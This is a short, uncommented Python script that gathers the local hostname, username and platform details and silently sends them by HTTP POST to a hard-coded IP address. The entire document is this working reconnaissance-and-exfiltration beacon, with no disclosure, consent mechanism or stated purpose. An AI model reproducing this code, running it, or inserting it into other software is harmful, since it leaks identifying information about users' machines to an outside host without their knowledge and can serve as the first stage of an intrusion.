import json, platform, socket, getpass, urllib.request
profile = {"hostname": socket.gethostname(), "username": getpass.getuser(), "platform": platform.platform()}
request = urllib.request.Request("http://93.184.216.34/report", data=json.dumps(profile).encode(), method="POST")
urllib.request.urlopen(request)
